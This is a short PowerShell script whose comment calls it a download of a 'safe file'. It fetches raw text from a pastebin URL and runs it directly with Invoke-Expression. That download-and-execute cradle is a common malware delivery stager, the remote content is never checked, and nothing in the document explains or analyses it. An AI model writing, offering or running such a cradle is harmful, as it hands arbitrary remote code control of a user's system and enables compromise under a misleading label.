
﻿# URL to download safe file
$scriptUrl = "https://pastebin.com/raw/34Dv0gCV"
# Download script
$scriptBytes = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -Method Get -MaximumRedirection 0 
$scriptContent = [System.Text.Encoding]::UTF8.GetString($scriptBytes.Content)
# Run the script
Invoke-Expression -Command $scriptContent
